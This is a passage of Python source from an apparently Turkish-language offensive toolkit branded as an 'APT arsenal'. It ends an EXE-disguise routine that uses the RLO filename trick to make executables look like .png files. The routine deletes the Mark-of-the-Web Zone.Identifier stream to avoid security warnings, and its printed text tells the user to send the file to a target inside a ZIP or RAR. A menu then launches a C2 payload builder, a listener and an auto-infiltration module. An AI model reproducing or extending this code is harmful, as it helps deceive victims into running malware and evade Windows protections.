        # final_exe artık disguise_pkg klasörünün içinde open.exe
        # Tüm dosyaların Moduller\\11_Gizli_Zararli_Olusturucu içine kopyalanması gerekiyor.
        if decoy_path and os.path.exists(decoy_path):
            # pkg_dir içindeki dosyaları kopyala
            for f in os.listdir(pkg_dir):
                if f == "open.exe" or f == "open.vbs":
                    shutil.copy2(os.path.join(pkg_dir, f), rlo_path)
                elif f != "launcher.cs":
                    shutil.copy2(os.path.join(pkg_dir, f), os.path.join(rlo_dir, f))
        else:
            shutil.copy2(final_exe, rlo_path)

        # MOTW temizle
        try:
            subprocess.run(['powershell', '-c',
                f'Remove-Item -Path "{os.path.abspath(rlo_path)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
                capture_output=True)
        except: pass

        print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
        print(f"{C.GREEN}{C.BOLD}  ║  ✅ EXE GİZLEME TAMAMLANDI!                         ║{C.RESET}")
        print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
        print(f"\n{C.WHITE}  📁 Dosya     : {os.path.abspath(rlo_path)}{C.RESET}")
        print(f"{C.WHITE}  👁️  Görünüm   : {base_name}{reversed_real_ext}.{fake_ext}{C.RESET}")
        print(f"{C.WHITE}  📝 Gerçek Uzantı: .{real_ext}{C.RESET}")
        print(f"{C.WHITE}  🎭 Yem Dosya : {'Evet' if decoy_path and os.path.exists(decoy_path) else 'Hayır'}{C.RESET}")
        print(f"\n{C.YELLOW}  [!] RLO trick sayesinde dosya hedefin bilgisayarında .png gibi görünür.{C.RESET}")
        print(f"{C.YELLOW}  [!] WinRAR/ZIP içine koyarak gönderin.{C.RESET}")

        if os.name == 'nt':
            os.startfile(rlo_dir)

        input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}  [-] HATA OLUŞTU: {e}{C.RESET}")
        import traceback
        traceback.print_exc()
        input(f"\n{C.YELLOW}  Hata detayı için Enter'a basın...{C.RESET}")

# ══════════════════════════════════════════════════════════
#  EXTERNAL TOOLS EXECUTOR
# ══════════════════════════════════════════════════════════


# --- KARARGAH DYNAMIC MENU ---
R = C.RED
G = C.GREEN
Y = C.YELLOW
C_color = C.CYAN
W = C.RESET
D = C.DIM

ASCII_ART = f"""{R}
    ██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗
    ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██████╔╝█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║
    ██╔══██╗██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
    ██║  ██║███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
    {W}{D}--- ⚡ Yüzde Yüz Türkçe ve Özelleştirilmiş APT Cephaneliği ⚡ ---{W}
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_categories():
    base_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller")
    if not os.path.exists(base_dir): return []
    folders = [f for f in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, f)) and f[0].isdigit()]
    return sorted(folders)

def list_files(category_folder):
    base_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller")
    cat_dir = os.path.join(base_dir, category_folder)
    files = [f for f in os.listdir(cat_dir) if f.endswith('.py') or f.endswith('.bat')]
    return sorted(files)

def run_script(path):
    clear_screen()
    print(f"{C_color}[*] Çalıştırılıyor: {path}{W}\n")
    os.system(f'python "{path}"' if path.endswith('.py') else f'"{path}"')
    input(f"\n{Y}[!] Devam etmek için ENTER tuşuna basın...{W}")

def main_menu():
    while True:
        clear_screen()
        print(ASCII_ART)
        categories = get_categories()
        
        print(f"{C_color}[ M E N Ü ]{W}\n")
        print(f"  {G}0.{W} Komuta_Kontrol_Merkezi_C2.py {R}[🔥 ANA SİSTEM]{W}")
        print(f"  {G}00.{W} Oto_Sizma_Araci.py {R}[⚔️ OTOMASYON]{W}")
        print()
        
        for i, cat in enumerate(categories, 1):
            cat_name = cat.split('_', 1)[1].replace('_', ' ')
            print(f"  {G}{i}.{W} {cat_name}")
            
        print(f"\n  {R}99.{W} Çıkış")
        
        choice = input(f"\n{Y}arsenal@karargah:~# {W}").strip()
        
        if choice == '99':
            print(f"{C_color}[*] Sistemden çıkılıyor... Güvende kalın!{W}")
            sys.exit(0)
        elif choice == '0':
            # C2 Alt Menüsü
            while True:
                clear_screen()
                print(ASCII_ART)
                print(f"{C_color}[ C2 KOMUTA MERKEZİ ]{W}\n")
                print(f"  {G}1.{W} Payload Builder (EXE Oluştur)")
                print(f"  {G}2.{W} Listener (Dinleyici)")
                print(f"  {G}3.{W} EXE Disguise (Dosya Kılık Değiştirme)")
                print(f"\n  {R}0.{W} Ana Menüye Dön")
                c2_choice = input(f"\n{Y}c2@karargah:~# {W}").strip()
                if c2_choice == '1': c2_payload_builder()
                elif c2_choice == '2': c2_listener()
                elif c2_choice == '3': c2_disguise()
                elif c2_choice == '0': break

        elif choice == '00':
            run_script('Moduller/00_Oto_Sizma_Araci/Oto_Sizma_Araci.py')
        elif choice.isdigit() and 1 <= int(choice) <= len(categories):
            cat_folder = categories[int(choice)-1]
            category_menu(cat_folder)

def category_menu(cat_folder):
    while True:
        clear_screen()
        cat_name = cat_folder.split('_', 1)[1].replace('_', ' ')
        print(f"{R}>> {cat_name} <<{W}\n")
        
        files = list_files(cat_folder)
        if not files:
            print(f"{D}Bu kategoride araç bulunamadı.{W}")
        else:
            for i, f in enumerate(files, 1):
                print(f"  {G}{i}.{W} {f}")
                
        print(f"\n  {R}0.{W} Geri Dön")
        
        choice = input(f"\n{Y}{cat_name.lower()}@karargah:~# {W}").strip()
        
        if choice == '0':
            break
        elif choice.isdigit() and 1 <= int(choice) <= len(files):
            script_path = os.path.join("Moduller", cat_folder, files[int(choice)-1])
            run_script(script_path)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Zorla çıkış yapıldı.{W}")
        sys.exit(0)
